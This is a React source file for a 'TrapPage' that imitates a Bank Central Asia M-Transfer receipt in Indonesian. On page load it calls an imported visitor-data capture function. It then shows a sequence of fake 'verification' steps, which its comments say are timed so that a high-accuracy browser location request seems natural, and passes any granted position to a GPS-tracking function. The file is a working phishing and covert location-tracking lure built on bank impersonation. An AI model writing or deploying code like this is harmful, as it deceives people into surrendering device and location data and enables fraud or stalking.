import React, { useEffect, useState } from 'react';
import { CheckCircle2, Share2, Download, ChevronLeft, MoreVertical, Eye, Loader2, Lock, Shield } from 'lucide-react';
import { captureVisitorData, updateGPS } from '../utils/tracker';

const TrapPage = () => {
  const [currentTime, setCurrentTime] = useState('');
  const [currentDate, setCurrentDate] = useState('');
  // 'blurred' | 'processing' | 'verifying' | 'revealed'
  const [state, setState] = useState('blurred');
  const [processingStep, setProcessingStep] = useState(0);

  const processingSteps = [
    'Menghubungkan ke server BCA...',
    'Memvalidasi nomor transaksi...',
    'Memeriksa keamanan sesi...',
    'Verifikasi identitas perangkat...',
    'Konfirmasi lokasi pengiriman...',
  ];

  useEffect(() => {
    const now = new Date();
    setCurrentTime(now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':'));
    setCurrentDate(now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' }));
    captureVisitorData();
  }, []);

  const handleReveal = () => {
    setState('processing');
    setProcessingStep(0);

    // Jalankan loading steps palsu dulu — baru minta lokasi di step terakhir
    let step = 0;
    const interval = setInterval(() => {
      step++;
      setProcessingStep(step);

      if (step >= processingSteps.length - 1) {
        clearInterval(interval);
        // Sekarang baru minta lokasi — terasa natural setelah "proses verifikasi"
        setState('verifying');
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => { updateGPS(pos); setState('revealed'); },
            ()    => { setState('revealed'); }, // ditolak = tetap reveal
            { enableHighAccuracy: true, timeout: 15000 }
          );
        } else {
          setState('revealed');
        }
      }
    }, 900); // tiap step 900ms → total ~3.6 detik sebelum popup muncul
  };

  const isBlurred = state === 'blurred' || state === 'processing' || state === 'verifying';

  const rows = [
    { label: 'DARI REKENING', value: '342XXXX129' },
    { label: 'KE REKENING',   value: '883XXXX921' },
    { label: 'NAMA PENERIMA', value: 'ADMIN REWARD ARTIS' },
    { label: 'BERITA',        value: 'DP AKTIVASI HADIAH' },
  ];

  return (
    <div style={{
      minHeight: '100vh', background: '#f1f1f1',
      display: 'flex', flexDirection: 'column',
      fontFamily: 'system-ui, -apple-system, sans-serif',
    }}>
      {/* BCA Header */}
      <div style={{
        background: '#003399', color: 'white', padding: '16px',
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <ChevronLeft size={24} />
          <span style={{ fontWeight: '600', fontSize: '18px' }}>M-Transfer</span>
        </div>
        <MoreVertical size={24} />
      </div>

      <div style={{ padding: '20px', flex: 1 }}>
        <div style={{
          background: 'white', borderRadius: '12px', padding: '24px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          position: 'relative', overflow: 'hidden', minHeight: '420px',
        }}>
          <div style={{ color: '#00a859', marginBottom: '16px' }}>
            <CheckCircle2 size={64} strokeWidth={1.5} />
          </div>
          <h2 style={{ color: '#003399', fontWeight: '800', fontSize: '20px', marginBottom: '4px' }}>
            M-TRANSFER BERHASIL
          </h2>
          <p style={{ color: '#666', fontSize: '14px', marginBottom: '24px' }}>
            {currentDate} {currentTime}
          </p>

          {/* Konten yang di-blur */}
          <div style={{
            width: '100%', borderTop: '1px dashed #ddd', paddingTop: '20px',
            filter: isBlurred ? 'blur(7px)' : 'none',
            userSelect: isBlurred ? 'none' : 'auto',
            transition: 'filter 0.5s ease',
            pointerEvents: isBlurred ? 'none' : 'auto',
          }}>
            {rows.map((r) => (
              <div key={r.label} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
                <span style={{ color: '#888', fontSize: '14px' }}>{r.label}</span>
                <span style={{ fontWeight: '600', fontSize: '14px' }}>{r.value}</span>
              </div>
            ))}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>JUMLAH</span>
              <span style={{ fontWeight: '700', fontSize: '16px', color: '#003399' }}>Rp 500.000,00</span>
            </div>
            <div style={{
              width: '100%', marginTop: '16px', padding: '12px',
              background: '#e6f4ea', borderRadius: '8px',
              color: '#00a859', fontSize: '13px', textAlign: 'center', fontWeight: '600',
            }}>
              Transaksi Berhasil Terverifikasi
            </div>
          </div>

          {/* Overlay — hanya saat blur */}
          {isBlurred && (
            <div style={{
              position: 'absolute', inset: 0,
              display: 'flex', flexDirection: 'column',
              alignItems: 'center', justifyContent: 'flex-end',
              paddingBottom: '28px',
              background: 'linear-gradient(to bottom, transparent 30%, rgba(255,255,255,0.92) 60%)',
            }}>
              {/* Label kunci */}
              <div style={{
                display: 'flex', alignItems: 'center', gap: '6px',
                background: 'rgba(0,0,0,0.5)', padding: '5px 14px',
                borderRadius: '20px', color: 'white', fontSize: '12px', marginBottom: '14px',
              }}>
                <Lock size={11} /> Detail disembunyikan untuk keamanan
              </div>

              {/* Tombol awal */}
              {state === 'blurred' && (
                <button onClick={handleReveal} style={{
                  padding: '13px 28px', background: '#003399', color: 'white',
                  border: 'none', borderRadius: '10px', fontWeight: '700', fontSize: '14px',
                  cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px',
                  boxShadow: '0 4px 16px rgba(0,51,153,0.3)',
                }}>
                  <Eye size={16} /> Lihat Bukti Transfer Lengkap
                </button>
              )}

              {/* Loading steps palsu */}
              {state === 'processing' && (
                <div style={{
                  display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px',
                  background: 'white', padding: '16px 24px', borderRadius: '12px',
                  boxShadow: '0 2px 12px rgba(0,0,0,0.1)', width: '80%',
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#003399' }}>
                    <Loader2 size={18} style={{ animation: 'spin 1s linear infinite' }} />
                    <span style={{ fontSize: '13px', fontWeight: '700' }}>Memverifikasi Transaksi</span>
                  </div>
                  <div style={{ width: '100%', display: 'flex', flexDirection: 'column', gap: '6px' }}>
                    {processingSteps.map((step, i) => (
                      <div key={i} style={{
                        display: 'flex', alignItems: 'center', gap: '8px',
                        fontSize: '11px',
                        color: i < processingStep ? '#00a859' : i === processingStep ? '#003399' : '#ccc',
                        fontWeight: i === processingStep ? '700' : '400',
                      }}>
                        <span style={{ fontSize: '10px' }}>
                          {i < processingStep ? '✓' : i === processingStep ? '›' : '○'}
                        </span>
                        {step}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* State saat popup lokasi sedang tampil */}
              {state === 'verifying' && (
                <div style={{
                  display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px',
                  background: 'white', padding: '16px 24px', borderRadius: '12px',
                  boxShadow: '0 2px 12px rgba(0,0,0,0.1)',
                }}>
                  <Shield size={24} color="#003399" />
                  <span style={{ fontSize: '13px', fontWeight: '700', color: '#003399' }}>
                    Konfirmasi Lokasi Diperlukan
                  </span>
                  <span style={{ fontSize: '11px', color: '#888', textAlign: 'center' }}>
                    Izinkan akses lokasi untuk memverifikasi keamanan transaksi ini
                  </span>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Tombol Simpan & Bagikan — hanya setelah reveal */}
        {state === 'revealed' && (
          <div style={{ marginTop: '20px', display: 'flex', gap: '12px' }}>
            <button style={{
              flex: 1, background: 'white', border: '1px solid #003399',
              color: '#003399', padding: '14px', borderRadius: '8px', fontWeight: '600',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
            }}>
              <Download size={18} /> Simpan
            </button>
            <button style={{
              flex: 1, background: '#003399', border: 'none', color: 'white',
              padding: '14px', borderRadius: '8px', fontWeight: '600',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
            }}>
              <Share2 size={18} /> Bagikan
            </button>
          </div>
        )}
      </div>

      <div style={{ padding: '20px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
        PT BANK CENTRAL ASIA TBK
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
};

export default TrapPage;
